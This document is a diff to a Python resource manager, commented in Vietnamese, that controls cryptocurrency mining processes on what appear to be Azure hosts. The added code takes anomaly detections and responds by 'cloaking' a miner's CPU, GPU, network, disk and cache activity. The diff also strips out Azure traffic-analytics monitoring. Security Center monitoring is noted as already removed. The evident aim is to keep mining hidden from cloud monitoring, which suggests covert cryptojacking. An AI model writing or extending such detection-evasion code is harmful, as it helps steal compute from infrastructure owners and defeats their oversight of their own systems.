@@ -19,12 +19,12 @@ from .base_manager import BaseManager
 from .utils import MiningProcess, GPUManager
 from .cloak_strategies import CloakStrategy, CloakStrategyFactory
 
-# CHỈ GIỮ LẠI các import từ azure_clients TRỪ AzureSecurityCenterClient
+# CHỈ GIỮ LẠI các import từ azure_clients TRỪ AzureTrafficAnalyticsClient
 from .azure_clients import (
     AzureSentinelClient,
     AzureLogAnalyticsClient,
     AzureNetworkWatcherClient,
-    AzureTrafficAnalyticsClient,
+    # AzureTrafficAnalyticsClient đã được loại bỏ
     AzureAnomalyDetectorClient,
     AzureOpenAIClient
 )
@@ -107,7 +107,7 @@ class SharedResourceManager:
                 self.logger
             )
             self.logger.info(
-                f"Điều chỉnh số luồng CPU = {cpu_threads} cho tiến trình {process_name} (PID={pid})."
+                f"Điều chỉnh số luồng CPU = {cpu_threads} cho tiến trình {process_name} (PID: {pid})."
             )
         except Exception as e:
             self.logger.error(
@@ -417,7 +417,6 @@ class SharedResourceManager:
                 f"Lỗi execute_adjustments cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
             )
 
-
 class ResourceManager(BaseManager):
     _instance = None
     _instance_lock = Lock()
@@ -447,7 +446,7 @@ class ResourceManager(BaseManager):
         self.mining_processes_lock = rwlock.RWLockFair()
         self._counter = count()
 
-        # Azure (đã bỏ AzureSecurityCenterClient)
+        # Azure (đã bỏ AzureSecurityCenterClient và AzureTrafficAnalyticsClient)
         self.initialize_azure_clients()
         self.discover_azure_resources()
 
@@ -499,7 +498,7 @@ class ResourceManager(BaseManager):
         self.azure_log_analytics_client = AzureLogAnalyticsClient(self.logger)
         # ĐÃ BỎ self.azure_security_center_client
         self.azure_network_watcher_client = AzureNetworkWatcherClient(self.logger)
-        self.azure_traffic_analytics_client = AzureTrafficAnalyticsClient(self.logger)
+        # ĐÃ BỎ self.azure_traffic_analytics_client
         self.azure_anomaly_detector_client = AzureAnomalyDetectorClient(self.logger, self.config)
         self.azure_openai_client = AzureOpenAIClient(self.logger, self.config)
 
@@ -515,10 +514,12 @@ class ResourceManager(BaseManager):
             )
             self.logger.info(f"Khám phá {len(self.nsgs)} NSGs.")
 
-            self.traffic_analytics_workspaces = self.azure_traffic_analytics_client.get_traffic_workspace_ids()
-            self.logger.info(
-                f"Khám phá {len(self.traffic_analytics_workspaces)} Traffic Analytics Workspaces."
-            )
+            # Đã loại bỏ việc khám phá Traffic Analytics Workspaces
+            # self.traffic_analytics_workspaces = self.azure_traffic_analytics_client.get_traffic_workspace_ids()
+            # self.logger.info(
+            #     f"Khám phá {len(self.traffic_analytics_workspaces)} Traffic Analytics Workspaces."
+            # )
+            self.logger.info("Khám phá Traffic Analytics Workspaces đã bị loại bỏ.")
 
         except Exception as e:
             self.logger.error(f"Lỗi khám phá Azure: {e}\n{traceback.format_exc()}")
@@ -586,6 +587,27 @@ class ResourceManager(BaseManager):
 
                 for p in self.mining_processes:
                     self.check_power_and_enqueue(p, cpu_max_pwr, gpu_max_pwr)
+
+                # **Thu thập metrics và phát hiện bất thường**
+                metrics_data = self.collect_all_metrics()
+                
+                # Sử dụng phương thức đa biến nếu có
+                anomalies = self.azure_anomaly_detector_client.detect_anomalies_multivariate(metrics_data)
+                if anomalies:
+                    for pid, anomaly_info in anomalies.items():
+                        process = self.get_process_by_pid(pid)
+                        if process:
+                            adjustment_task = {
+                                'type': 'anomaly_detection',
+                                'process': process,
+                                'anomalous_metrics': anomaly_info
+                            }
+                            priority = 1  # Anomaly detection có ưu tiên cao hơn
+                            count_val = next(self._counter)
+                            self.resource_adjustment_queue.put((priority, count_val, adjustment_task))
+                            self.logger.warning(
+                                f"Phát hiện bất thường đa biến trong PID {pid}: {anomaly_info}"
+                            )
 
             except Exception as e:
                 self.logger.error(f"Lỗi monitor_and_adjust: {e}\n{traceback.format_exc()}")
@@ -685,7 +707,7 @@ class ResourceManager(BaseManager):
                             'process': proc,
                             'action': openai_suggestions
                         }
-                        self.resource_adjustment_queue.put((2, task))
+                        self.resource_adjustment_queue.put((2, next(self._counter), task))
             except Exception as e:
                 self.logger.error(f"optimize_resources error: {e}\n{traceback.format_exc()}")
 
@@ -722,6 +744,36 @@ class ResourceManager(BaseManager):
                 f"Lỗi collect_metrics cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
             )
             return {}
+
+    def collect_all_metrics(self) -> Dict[str, Any]:
+        """
+        Thu thập toàn bộ metrics cho tất cả các tiến trình khai thác.
+        Trả về một dictionary với key là PID và value là các metrics.
+        """
+        metrics_data = {}
+        try:
+            with self.mining_processes_lock.gen_rlock():
+                for proc in self.mining_processes:
+                    metrics = self.collect_metrics(proc)
+                    metrics_data[str(proc.pid)] = metrics
+            self.logger.debug(f"Collected metrics data: {metrics_data}")
+        except Exception as e:
+            self.logger.error(f"Lỗi collect_all_metrics: {e}\n{traceback.format_exc()}")
+        return metrics_data
+
+    def get_process_by_pid(self, pid: int) -> Optional[MiningProcess]:
+        """
+        Lấy đối tượng MiningProcess dựa trên PID.
+        """
+        try:
+            with self.mining_processes_lock.gen_rlock():
+                for proc in self.mining_processes:
+                    if proc.pid == pid:
+                        return proc
+            self.logger.warning(f"Không tìm thấy tiến trình với PID={pid}.")
+        except Exception as e:
+            self.logger.error(f"Lỗi get_process_by_pid: {e}\n{traceback.format_exc()}")
+        return None
 
     def process_cloaking_requests(self):
         while not self.stop_event.is_set():
@@ -814,6 +866,9 @@ class ResourceManager(BaseManager):
                 elif task_type == 'monitoring':
                     adj = adjustment_task['adjustments']
                     self.apply_monitoring_adjustments(adj, process)
+                elif task_type == 'anomaly_detection':
+                    anomaly_info = adjustment_task['anomalous_metrics']
+                    self.apply_anomaly_adjustments(anomaly_info, process)
                 elif task_type == 'restore':
                     self.shared_resource_manager.restore_resources(process)
                     self.logger.info(
@@ -910,6 +965,39 @@ class ResourceManager(BaseManager):
         except Exception as e:
             self.logger.error(
                 f"Lỗi apply_recommended_action cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
+            )
+
+    def apply_anomaly_adjustments(self, anomaly_info: Dict[str, Any], process: MiningProcess):
+        """
+        Áp dụng các điều chỉnh dựa trên thông tin bất thường phát hiện được.
+        """
+        try:
+            adjustments = {}
+            # Giả sử anomaly_info chứa thông tin chi tiết về các metrics bất thường
+            for metric, info in anomaly_info.items():
+                if metric == 'Multivariate anomaly detected.':
+                    # Cần xác định rõ các metrics bị ảnh hưởng
+                    adjustments['cpu_cloak'] = True
+                    adjustments['gpu_cloak'] = True
+                    adjustments['network_cloak'] = True
+                    adjustments['disk_io_cloak'] = True
+                    adjustments['cache_cloak'] = True
+
+            if adjustments:
+                adjustment_task = {
+                    'type': 'monitoring',
+                    'process': process,
+                    'adjustments': adjustments
+                }
+                priority = 1  # Anomaly adjustments có ưu tiên cao
+                count_val = next(self._counter)
+                self.resource_adjustment_queue.put((priority, count_val, adjustment_task))
+                self.logger.info(
+                    f"Áp dụng các điều chỉnh dựa trên bất thường cho {process.name} (PID={process.pid}): {adjustments}"
+                )
+        except Exception as e:
+            self.logger.error(
+                f"Lỗi apply_anomaly_adjustments cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
             )
 
     def allocate_resources_with_priority(self):
